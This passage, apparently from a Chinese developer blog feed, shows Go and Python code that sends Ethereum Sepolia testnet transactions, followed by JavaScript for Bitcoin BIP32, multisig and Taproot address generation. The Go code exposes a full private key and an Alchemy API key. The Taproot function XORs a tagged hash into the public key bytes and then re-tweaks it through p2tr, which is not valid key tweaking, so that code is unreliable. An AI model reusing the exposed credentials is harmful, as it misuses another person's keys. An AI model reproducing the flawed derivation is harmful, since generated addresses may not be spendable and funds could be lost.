class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/ethereum/go-ethereum/common&quot;</span><br><span class="hljs-string">&quot;github.com/ethereum/go-ethereum/core/types&quot;</span><br><span class="hljs-string">&quot;github.com/ethereum/go-ethereum/crypto&quot;</span><br><span class="hljs-string">&quot;github.com/ethereum/go-ethereum/ethclient&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;math/big&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>PrivateKeyStr = <span class="hljs-string">&quot;c535facd6873ca2b3718e3ede4f626ae126c99b4a26b4354da704d8dc78b43c1&quot;</span>      <span class="hljs-comment">// go生成的账户 发送发私钥</span><br>fromAddrStr   = <span class="hljs-string">&quot;0xa3856a939A623EdBde8f908037d3F33FceBC5408&quot;</span>                            <span class="hljs-comment">// 对应go生成的账户 发送方地址</span><br>toAddrStr     = <span class="hljs-string">&quot;0x38B59D6D4ef6A4991926Cf04c7c2092a0E86140F&quot;</span>                            <span class="hljs-comment">// 接收方地址</span><br>ethUrl        = <span class="hljs-string">&quot;https://eth-sepolia.g.alchemy.com/v2/fzgfj4QuLlNEyn2LrLZsseBAClGdMnyP&quot;</span> <span class="hljs-comment">//API URL</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br><span class="hljs-comment">// 把私钥个地址转码一下</span><br>privateKey, _ := crypto.HexToECDSA(PrivateKeyStr)<br>toAddr := common.HexToAddress(toAddrStr)<br><br><span class="hljs-comment">// 新建连接，连上以太坊</span><br>client, err := ethclient.Dial(ethUrl)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br><span class="hljs-comment">// Get the balance of an account 第0步：查询账户余额，要先确认自己有没有钱</span><br>fromAddr := common.HexToAddress(fromAddrStr)<br>balance, err := client.BalanceAt(context.Background(), fromAddr, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>fmt.Printf(<span class="hljs-string">&quot;Account balance: %d\n&quot;</span>, balance) <span class="hljs-comment">// 1008465873901900000</span><br><br><span class="hljs-comment">// Get the latest known block 第0步：获取最新块高，刷新</span><br>block, err := client.BlockByNumber(context.Background(), <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>fmt.Printf(<span class="hljs-string">&quot;Latest block: %d\n&quot;</span>, block.Number().Uint64()) <span class="hljs-comment">//6055020</span><br><br><span class="hljs-comment">// 生成交易数据,这里注意fromAddr要转成 account common.Address对象</span><br><span class="hljs-comment">// 第一步拿nonce，这个拿nonce的的方法已经封装好了的，直接用就可，也可以去网站上copy url下来发请求，不过那样不优雅</span><br>nonce, err := client.PendingNonceAt(context.Background(), fromAddr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;nonce: %d\n&quot;</span>, nonce)<br><br><span class="hljs-comment">// 拿到gasPrice ，也可以不用拿，直接指定就可以</span><br>gasPriceNow, err := client.SuggestGasPrice(context.Background())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Failed to retrieve gas price: %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;gasPriceNow: %d\n&quot;</span>, gasPriceNow)<br><br>gasPrice := big.NewInt(<span class="hljs-number">2000000000</span>)<br>amount := big.NewInt(<span class="hljs-number">1100000000000000</span>)<br>gasLimit := <span class="hljs-type">uint64</span>(<span class="hljs-number">21208</span>)<br><span class="hljs-comment">//gasPrice := big.NewInt(1000)</span><br>data := []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>)<br><br><span class="hljs-comment">// 第二步 构建交易对象 ---&gt; 生成一个未签名的交易</span><br>tx := types.NewTx(&amp;types.LegacyTx&#123;<br>Nonce:    nonce,<br>To:       &amp;toAddr,<br>Value:    amount,<br>Gas:      gasLimit,<br>GasPrice: gasPrice,<br>Data:     data,<br>&#125;)<br><br><span class="hljs-comment">// 第三步 对交易进行签名，签名前先拿到链ID，即你要上的链</span><br>chainID, err := client.NetworkID(context.Background()) <span class="hljs-comment">// 拿到链ID</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>signedTx, err := types.SignTx(tx, types.NewEIP155Signer(chainID), privateKey) <span class="hljs-comment">// 对交易进行签名</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br><span class="hljs-comment">// 第四步  发送交易,这一步就是广播</span><br>err = client.SendTransaction(context.Background(), signedTx) <span class="hljs-comment">// 广播出去</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><br>fmt.Printf(<span class="hljs-string">&quot;转账交易已发送，交易哈希\n：%s\n&quot;</span>, signedTx.Hash().Hex())<br><span class="hljs-comment">// 第七笔交易哈希：转账交易已发送，交易哈希：0x93afb74b4c4f0bca6c1ccdf4a13fe555f7a8768201804c0e21ec33b50febec46</span><br><span class="hljs-comment">// 第八笔交易哈希：转账交易已发送，交易哈希：</span><br><span class="hljs-comment">// 前面的一直在pending中 有点问题，</span><br><span class="hljs-comment">// 第八笔交易哈希：转账交易已发送，交易哈希：0xd65407692e1f872d47ce1231a80d9afbf0dbcf8336362f78262d4fd872a55c81</span><br><span class="hljs-comment">// 第八笔交易哈希：转账交易已发送，交易哈希：0xcb297210b49a5a3747c27783ab3610b8b287134792e50ccbf6afe86c6c96edfd</span><br><span class="hljs-comment">// 第八笔交易哈希：转账交易已发送，交易哈希：0xc922a93fd5a5eabe7819623a65aa6b572e755658f3a9f24e71a64f3d533b1a87</span><br><span class="hljs-comment">// 第八笔交易哈希：转账交易已发送，交易哈希：0x4a8e649836a69d22e2b979c7330f03b97e7017b4a89d27e9c646051725f89a2c</span><br><span class="hljs-comment">// 第八笔交易哈希：转账交易已发送，交易哈希：0xae0b39c8cb2e02f7c647778f4325f0cca6392fe54c8f144a8e4ae58da79484eb</span><br><span class="hljs-comment">// 显示pending 然后转indexing状态 最后Success成功</span><br><span class="hljs-comment">// pending 状态： This txn hash was found in our secondary node and should be picked up by our indexer in a short while.</span><br><span class="hljs-comment">// indexing 状态：This transaction has been included and will be reflected in a short while.</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Python代码实现"><a href="#Python代码实现" class="headerlink" title="Python代码实现"></a>Python代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># 设置连接和账户信息</span><br>private_key = <span class="hljs-string">&quot;c535facd68xxxxxxxxxxx26ae126c99bda704d8dc78b43c1&quot;</span>  <span class="hljs-comment"># 发送方私钥</span><br>from_address = <span class="hljs-string">&quot;0xa3856a9xxxxxxxxe8f90835408&quot;</span>                     <span class="hljs-comment"># 发送方地址</span><br>to_address = <span class="hljs-string">&quot;0x38B59D6Dxxxxxxxx6Cf04c786140F&quot;</span>                    <span class="hljs-comment"># 接收方地址</span><br>eth_url = <span class="hljs-string">&quot;https://eth-sepolia.g.alchemy.com/v2/fzgfj4QuLlNEyn2LrLZsseBAClGdMnyP&quot;</span> <span class="hljs-comment"># API URL</span><br><br><span class="hljs-comment"># 连接到以太坊节点</span><br>web3 = Web3(Web3.HTTPProvider(eth_url))<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> web3.is_connected():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to connect to Ethereum node.&quot;</span>)<br>    exit()<br><br><span class="hljs-comment"># 检查账户余额</span><br>balance = web3.eth.get_balance(from_address)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Account balance: <span class="hljs-subst">&#123;web3.from_wei(balance, <span class="hljs-string">&#x27;ether&#x27;</span>)&#125;</span> ETH&quot;</span>)<br><br><span class="hljs-comment"># 获取最新区块号</span><br>block = web3.eth.get_block(<span class="hljs-string">&#x27;latest&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Latest block: <span class="hljs-subst">&#123;block.number&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 获取交易计数 (nonce) 这个才是关键</span><br>nonce = web3.eth.get_transaction_count(from_address)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Nonce: <span class="hljs-subst">&#123;nonce&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 建议的 gas 价格 可以不接受建议</span><br>gas_price = web3.eth.gas_price<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Gas price: <span class="hljs-subst">&#123;web3.from_wei(gas_price, <span class="hljs-string">&#x27;gwei&#x27;</span>)&#125;</span> Gwei&quot;</span>)<br><br><span class="hljs-comment"># 创建交易</span><br>transaction = &#123;<br>    <span class="hljs-string">&#x27;to&#x27;</span>: to_address,<br>    <span class="hljs-comment"># &#x27;value&#x27;: web3.toWei(0.0011, &#x27;ether&#x27;),  # 发送的以太币数量</span><br>    <span class="hljs-string">&#x27;value&#x27;</span>: <span class="hljs-number">1100000000000000</span>,  <span class="hljs-comment"># 发送的以太币数量</span><br>    <span class="hljs-string">&#x27;gas&#x27;</span>: <span class="hljs-number">21320</span>,  <span class="hljs-comment"># Gas limit</span><br>    <span class="hljs-string">&#x27;gasPrice&#x27;</span>: <span class="hljs-number">2000000000</span>,  <span class="hljs-comment"># Gas price</span><br>    <span class="hljs-string">&#x27;nonce&#x27;</span>: nonce,<br>    <span class="hljs-string">&#x27;data&#x27;</span>: web3.to_hex(<span class="hljs-string">b&quot;Hello, World! python&quot;</span>),  <span class="hljs-comment"># 附加的数据</span><br>    <span class="hljs-string">&#x27;chainId&#x27;</span>: web3.eth.chain_id  <span class="hljs-comment"># 链 ID</span><br>&#125;<br><br><span class="hljs-comment"># 对交易进行签名</span><br>signed_tx = web3.eth.account.sign_transaction(transaction, private_key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Transaction hash: <span class="hljs-subst">&#123;signed_tx.<span class="hljs-built_in">hash</span>.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 发送交易</span><br>tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Transaction sent, hash: <span class="hljs-subst">&#123;tx_hash.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><span class="hljs-comment"># 第一笔交易：0x22af000c45f51c03e88ea21281ccd571359e653341aef2a7fadbdc96b41eee49</span><br><span class="hljs-comment"># 第二笔交易：0xa502a7a7f589555eb0ce9bbd2d48220c860bbd0b7bf33b97819932ac0b092d6e</span><br><span class="hljs-comment"># 第三笔交易：0x775b97666b65444f2bb1b2bad852dbb9b56020fdbab513336cdec46bad1c2a36</span><br><br></code></pre></td></tr></table></figure><h1 id="5-中心化钱包"><a href="#5-中心化钱包" class="headerlink" title="5.中心化钱包"></a>5.中心化钱包</h1><h3 id="5-1-离线地址生成"><a href="#5-1-离线地址生成" class="headerlink" title="5.1 离线地址生成"></a>5.1 离线地址生成</h3><ul><li><p>调用签名机生成密钥对，签名机吐出公钥，（交易所钱包私钥被统一管控）</p></li><li><p>拿到公钥就可以使用公钥导出地址了</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>07-1 Bitcoin 钱包开发简单流程</title>
    <link href="/2024/05/30/07-1%E6%AF%94%E7%89%B9%E5%B8%81%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E7%AE%80%E5%8D%95%E6%B5%81%E7%A8%8B/"/>
    <url>/2024/05/30/07-1%E6%AF%94%E7%89%B9%E5%B8%81%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E7%AE%80%E5%8D%95%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="1-比特币钱包开发"><a href="#1-比特币钱包开发" class="headerlink" title="1 比特币钱包开发"></a>1 比特币钱包开发</h1><blockquote><p>因为是JS代码，所以会有很多看不懂的地方，没关系</p></blockquote><h2 id="1-1-地址生成"><a href="#1-1-地址生成" class="headerlink" title="1.1 地址生成"></a>1.1 地址生成</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> bitcoin <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;bitcoinjs-lib&#x27;</span>;<br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> ecc <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;tiny-secp256k1&#x27;</span>;<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">BIP32Factory</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;bip32&#x27;</span>);<br><span class="hljs-keyword">const</span> bip32 = <span class="hljs-title class_">BIP32Factory</span>(ecc); <span class="hljs-comment">// 这里还是bip32</span><br><br><span class="hljs-comment">// 创建地址的函数，和py是一样的流程，都是调用bip32里面的方法，看函数返回</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createAddress</span> (<span class="hljs-attr">params</span>: any): any &#123;<br>  <span class="hljs-keyword">const</span> &#123; seedHex, receiveOrChange, addressIndex, network, method &#125; = params;<br>  <span class="hljs-keyword">const</span> root = bip32.<span class="hljs-title function_">fromSeed</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(seedHex, <span class="hljs-string">&#x27;hex&#x27;</span>));<br>  <span class="hljs-keyword">let</span> path = <span class="hljs-string">&quot;m/44&#x27;/0&#x27;/0&#x27;/0/&quot;</span> + addressIndex + <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (receiveOrChange === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>    path = <span class="hljs-string">&quot;m/44&#x27;/0&#x27;/0&#x27;/1/&quot;</span> + addressIndex + <span class="hljs-string">&#x27;&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">const</span> child = root.<span class="hljs-title function_">derivePath</span>(path);<br>  <span class="hljs-keyword">let</span> <span class="hljs-attr">address</span>: string;<br>  <span class="hljs-keyword">switch</span> (method) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p2pkh&#x27;</span>:<br>      <span class="hljs-comment">// eslint-disable-next-line no-case-declarations</span><br>      <span class="hljs-keyword">const</span> p2pkhAddress = bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2pkh</span>(&#123;<br>        <span class="hljs-attr">pubkey</span>: child.<span class="hljs-property">publicKey</span>,<br>        <span class="hljs-attr">network</span>: bitcoin.<span class="hljs-property">networks</span>[network]<br>      &#125;);<br>      address = p2pkhAddress.<span class="hljs-property">address</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p2wpkh&#x27;</span>:<br>      <span class="hljs-comment">// eslint-disable-next-line no-case-declarations</span><br>      <span class="hljs-keyword">const</span> p2wpkhAddress = bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2wpkh</span>(&#123;<br>        <span class="hljs-attr">pubkey</span>: child.<span class="hljs-property">publicKey</span>,<br>        <span class="hljs-attr">network</span>: bitcoin.<span class="hljs-property">networks</span>[network]<br>      &#125;);<br>      address = p2wpkhAddress.<span class="hljs-property">address</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p2sh&#x27;</span>:<br>      <span class="hljs-comment">// eslint-disable-next-line no-case-declarations</span><br>      <span class="hljs-keyword">const</span> p2shAddress = bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2sh</span>(&#123;<br>        <span class="hljs-attr">redeem</span>: bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2wpkh</span>(&#123;<br>          <span class="hljs-attr">pubkey</span>: child.<span class="hljs-property">publicKey</span>,<br>          <span class="hljs-attr">network</span>: bitcoin.<span class="hljs-property">networks</span>[network]<br>        &#125;)<br>      &#125;);<br>      address = p2shAddress.<span class="hljs-property">address</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This way can not support&#x27;</span>);<br>  &#125;<br><span class="hljs-comment">// 看返回，私钥、公钥、和地址</span><br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">privateKey</span>: <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(child.<span class="hljs-property">privateKey</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>    <span class="hljs-attr">publicKey</span>: <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(child.<span class="hljs-property">publicKey</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>    address<br>  &#125;;<br>&#125;<br><span class="hljs-comment">// 创建多重签名地址</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createMultiSignAddress</span> (<span class="hljs-attr">params</span>: any): string &#123;<br>  <span class="hljs-keyword">const</span> &#123; pubkeys, network, method, threshold &#125; = params;<br>  <span class="hljs-keyword">switch</span> (method) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p2pkh&#x27;</span>:<br>      <span class="hljs-keyword">return</span> bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2sh</span>(&#123;<br>        <span class="hljs-attr">redeem</span>: bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2ms</span>(&#123;<br>          <span class="hljs-attr">m</span>: threshold,<br>          <span class="hljs-attr">network</span>: bitcoin.<span class="hljs-property">networks</span>[network],<br>          pubkeys<br>        &#125;)<br>      &#125;).<span class="hljs-property">address</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p2wpkh&#x27;</span>:<br>      <span class="hljs-keyword">return</span> bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2wsh</span>(&#123;<br>        <span class="hljs-attr">redeem</span>: bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2ms</span>(&#123;<br>          <span class="hljs-attr">m</span>: threshold,<br>          <span class="hljs-attr">network</span>: bitcoin.<span class="hljs-property">networks</span>[network],<br>          pubkeys<br>        &#125;)<br>      &#125;).<span class="hljs-property">address</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p2sh&#x27;</span>:<br>      <span class="hljs-keyword">return</span> bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2sh</span>(&#123;<br>        <span class="hljs-attr">redeem</span>: bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2wsh</span>(&#123;<br>          <span class="hljs-attr">redeem</span>: bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2ms</span>(&#123;<br>            <span class="hljs-attr">m</span>: threshold,<br>            <span class="hljs-attr">network</span>: bitcoin.<span class="hljs-property">networks</span>[network],<br>            pubkeys<br>          &#125;)<br>        &#125;)<br>      &#125;).<span class="hljs-property">address</span>;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This way can not support&#x27;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x00&#x27;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-comment">// 创建Schnorr 地址</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createSchnorrAddress</span> (<span class="hljs-attr">params</span>: any): any &#123;<br>  bitcoin.<span class="hljs-title function_">initEccLib</span>(ecc);<br><br>  <span class="hljs-keyword">const</span> &#123; seedHex, receiveOrChange, addressIndex &#125; = params;<br>  <span class="hljs-keyword">const</span> root = bip32.<span class="hljs-title function_">fromSeed</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(seedHex, <span class="hljs-string">&#x27;hex&#x27;</span>));<br>  <span class="hljs-keyword">let</span> path = <span class="hljs-string">&quot;m/44&#x27;/0&#x27;/0&#x27;/0/&quot;</span> + addressIndex + <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (receiveOrChange === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>    path = <span class="hljs-string">&quot;m/44&#x27;/0&#x27;/0&#x27;/1/&quot;</span> + addressIndex + <span class="hljs-string">&#x27;&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">const</span> childKey = root.<span class="hljs-title function_">derivePath</span>(path);<br>  <span class="hljs-keyword">const</span> privateKey = childKey.<span class="hljs-property">privateKey</span>;<br>  <span class="hljs-keyword">if</span> (!privateKey) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;No private key found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> publicKey = childKey.<span class="hljs-property">publicKey</span>;<br><br>  <span class="hljs-keyword">const</span> tweak = bitcoin.<span class="hljs-property">crypto</span>.<span class="hljs-title function_">taggedHash</span>(<span class="hljs-string">&#x27;TapTweak&#x27;</span>, publicKey.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>, <span class="hljs-number">33</span>));<br>  <span class="hljs-keyword">const</span> tweakedPublicKey = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(publicKey);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; ++i) &#123;<br>    tweakedPublicKey[<span class="hljs-number">1</span> + i] ^= tweak[i];<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> &#123; address &#125; = bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2tr</span>(&#123;<br>    <span class="hljs-attr">internalPubkey</span>: tweakedPublicKey.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>, <span class="hljs-number">33</span>)<br>  &#125;);<br><span class="hljs-comment">// 返回私钥、公钥、和地址</span><br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">privateKey</span>: <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(childKey.<span class="hljs-property">privateKey</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>    <span 